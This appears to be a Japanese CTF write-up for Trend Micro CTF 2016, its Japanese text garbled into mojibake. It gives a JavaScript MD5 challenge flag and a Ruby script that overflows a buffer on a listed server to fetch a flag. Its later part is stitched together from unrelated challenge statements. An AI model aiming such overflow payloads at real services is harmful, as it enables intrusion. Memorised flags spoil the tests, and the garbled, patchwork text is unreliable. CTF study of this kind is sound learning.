item.description:
æ—¥æœ¬æ™‚é–“ 2016-07-30 13:00 ã‹ã‚‰ 2016-07-31 13:00ã¾ã§ï¼ˆ24æ™‚é–“ï¼‰ã«è¡Œã‚ã‚ŒãŸTrend Micro CTF 2016ã®write-upã§ã™ã€‚

Analysis-Offensive 100ã‚’yyuã€Analysis-Offensive 200ã€Misc 100ã€Misc 200ã‚’maythãŒè§£ç­”ã—ã¾ã—ãŸã€‚

Analysis - Offensive 100

Category: Analysis/Offensive

Points: 100

Please enter key. Key is TMCTF flag.

Download the file Decrypt the downloaded file by the following command.

openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip

unzip files1.zip

ã“ã®å•é¡Œã¯å·¨å¤§ãªJavaScriptã‹ã‚‰æ­£è§£ã®éµã‚’å¾—ã‚‹ã¨ã„ã†ã‚‚ã®ã§ã™ã€‚ ã¾ãšã€å·¨å¤§ãªJavaScriptã®ã†ã¡ã®å¤šãã®éƒ¨åˆ†ã¯å®šæ•°ã‚’Googleã§èª¿ã¹ã‚‹ãªã©ã™ã‚‹ã¨ã€MD5ã‚’å®Ÿè£…ã—ã¦ã„ã‚‹ã¨ã„ã†ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚ãã—ã¦ã€æ¬¡ã®3ã¤ã®æ–‡å­—åˆ—ã‚‚MD5ã®ãƒãƒƒã‚·ãƒ¥å€¤ã§ã‚ã‚ã†ã¨ã„ã†æ¨æ¸¬ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã‚‰ã‚’ã¾ãŸGoogleã§èª¿ã¹ã‚‹ã¨ã€ãã‚Œãã‚Œæ¬¡ã®ã‚ˆã†ãªæ–‡å­—åˆ—ã§ã‚ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚

  • 61636f697b57b5b7d389db0edb801fc3 â†’ qwerty
  • d2172edf24129e06f3913376a12919a4 â†’ admin

ãã—ã¦æ¬¡ã®å‡¦ç†ã§ã“ã‚Œã‚‰ã®æ–‡å­—åˆ—ã‚’å¤‰æ•°nlã«å¾“ã£ã¦ä¸¦ã³æ›ãˆã¦ã„ã‚‹ã¨ã„ã†ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚

var c = "", d = "", e = "";
for (var f = 0; f < b.length; ) {
    c += b[nl[++f]];
    d += b[nl[++f]];

æœ€çµ‚çš„ã«ãƒ•ãƒ©ã‚°ã¯TMCTF{q6r4dy5ei2na1twm3}ã§ã—ãŸã€‚

Analysis - Offensive 200

Category: Analysis - offensive

Points: 200

This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.

The following code contains a bug that can be exploited to read back a flag:

int pwned;
char buffer[1024];

DWORD WINAPI CallBack(LPVOID lpParameter) {
	pwned = 0;
	ZeroMemory(buffer, 1024);
	SOCKET *sock = (SOCKET *)lpParameter;
	SOCKET _sock = *sock;
	send(_sock, "Welcome", 8, 0);
	int ret = 0;
	ret = recv(_sock, buffer, 1028, 0);
	printf("[x] RET: %d.\n", ret);
	printf("[x] PWNED: 0x%x.\n", pwned);
	Sleep(1);
	if (((pwned >> 16)&0xFFFF ^ 0xc0fe) == 0x7eaf && (((pwned & 0xFFFF)^0x1a1a) == 0xdae4)) {

			send(_sock, "PWNED", 5, 0);
			ReadAndReturn(L"key.txt", _sock);
			closesocket(_sock);
			return 0;
	}
	else {
		send(_sock, "GO AWAY", 7, 0);
		closesocket(_sock);
	}

	return 0;
 }

Craft a packet that would return a valid flag. Good luck!

bufferãŒ1024ãƒã‚¤ãƒˆã—ã‹ç¢ºä¿ã•ã‚Œã¦ã„ãªã„ã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€11è¡Œç›®ã§ ret = recv(_sock, buffer, 1028, 0); ã¨1028ãƒã‚¤ãƒˆèª­ã¿è¾¼ã‚€ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚ã—ãŸãŒã£ã¦ã€1025-1028ãƒã‚¤ãƒˆã®ç¯„å›²ã«ç‰¹å®šã®ãƒã‚¤ãƒˆåˆ—ã‚’ä»•è¾¼ã‚ã°ã‚ˆã„ã€‚æº€ãŸã™ã¹ãæ¡ä»¶ã¯15è¡Œç›®ã®ifæ–‡ã€‚

ãªãœã‹ nc ãŒ1024ãƒã‚¤ãƒˆã§é€ä¿¡ã‚’æ‰“ã¡åˆ‡ã£ã¦ã—ã¾ã£ãŸã®ã§ã€Rubyã§æ›¸ã„ãŸã€‚

require 'socket'

HOST = '52.197.128.90'
port = (80..85).to_a.sample

puts "connecting #{HOST}:#{port}"
sock = TCPSocket.open('52.197.128.90', port)

payload = 'a' * 1024 + "\xfe\xc0\x51\xbe"

sock.read(8)
sock.send(payload, 0)
while r = sock.gets
  puts r
end

ãã—ã¦æ­£è§£ã‚’ãƒ¡ãƒ¢ã—å¿˜ã‚ŒãŸ ğŸ˜‡

Please analyze this pcap.

Misc 200

Category: Misc(iot and network)

Points: 200

find all LTE bands this phone supported.

the final answer will be from small to big, and use ‘,’ to seperate without spaces.

example> if the answer is band 1 and 2 and 3, the key should be: “TMCTF{1,2,3}”

Exploitation 50: alligatorsim95

Don’t try to automate adding X eggs at a time

legends circulate in florida of an alligator that had laid millions of eggs. use this simulator to try to achieve the same greatness

Exploitation 55: Dance

Some prefer the stanky leg, others prefer the dab, but what dance moves do you have?

IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒãƒ¼ãƒˆç•ªå·ãŒæŒ‡å®šã•ã‚Œã‚‹ã€‚å½“åˆãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯ä¸ãˆã‚‰ã‚Œãªã‹ã£ãŸãŒã€å¾Œã«ãƒ•ãƒ©ã‚°éƒ¨åˆ†ã‚’æ½°ã—ãŸãƒã‚¤ãƒŠãƒªãŒé…å¸ƒã•ã‚ŒãŸã€‚

while (strlen(buf) > 0) {
  if (*buf == 'n') {
    buf += 7;
    donaenae();
  } else if (*buf == 'w') {
    buf += 5;
    dowhip();
  }
}
check_flag();
